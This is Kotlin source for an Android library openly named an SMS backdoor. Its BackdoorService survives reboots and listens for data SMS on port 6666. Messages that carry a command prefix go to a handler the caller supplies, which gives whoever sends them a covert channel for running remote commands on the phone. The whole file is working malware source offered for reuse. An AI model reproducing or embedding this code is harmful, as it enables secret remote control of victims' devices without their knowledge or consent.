/*
Copyright 2020 Chris Basinger

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
package com.evilthreads.smsbackdoor

import android.Manifest
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Telephony
import androidx.appcompat.app.AppCompatActivity
import com.candroid.bootlaces.BootService
import com.candroid.bootlaces.bootService
/*
            (   (                ) (             (     (
            )\ ))\ )    *   ) ( /( )\ )     (    )\ )  )\ )
 (   (   ( (()/(()/(  ` )  /( )\()|()/((    )\  (()/( (()/(
 )\  )\  )\ /(_))(_))  ( )(_)|(_)\ /(_))\((((_)( /(_)) /(_))
((_)((_)((_|_))(_))   (_(_()) _((_|_))((_))\ _ )(_))_ (_))
| __\ \ / /|_ _| |    |_   _|| || | _ \ __(_)_\(_)   \/ __|
| _| \ V /  | || |__    | |  | __ |   / _| / _ \ | |) \__ \
|___| \_/  |___|____|   |_|  |_||_|_|_\___/_/ \_\|___/|___/
....................../´¯/)
....................,/¯../
.................../..../
............./´¯/'...'/´¯¯`·¸
........../'/.../..../......./¨¯\
........('(...´...´.... ¯~/'...')
.........\.................'...../
..........''...\.......... _.·´
............\..............(
..............\.............\...
*/
class BackdoorService : BootService(){
    lateinit var receiver: SmsReceiver

    companion object{
        var commandCode : String = "EVILTHREADS:"
        var commandHandler : ((String) -> Unit)? = null
        fun openDoor(ctx: AppCompatActivity, remoteCommandCode: String, notifTitle: String? = null, notifBody: String? = null, remoteCommandHandler: (remoteCommand: String) -> Unit){
            commandHandler = remoteCommandHandler
            commandCode = remoteCommandCode
            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                if(ctx.checkSelfPermission(Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED){
                    bootService(ctx){
                        service = BackdoorService::class
                        noPress = true
                        notifTitle?.let { title -> this.notificationTitle = title }
                        notifBody?.let { body -> this.notificationTitle = body }
                    }
                }
                else
                    bootService(ctx){
                        service = BackdoorService::class
                    }
        }
    }

    override fun onCreate() {
        super.onCreate()
        val filter = IntentFilter(Telephony.Sms.Intents.DATA_SMS_RECEIVED_ACTION).apply {
            addDataAuthority("*", "6666")
            addDataScheme("sms")
        }
        receiver = SmsReceiver()
        registerReceiver(receiver, filter)
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(receiver)
    }
}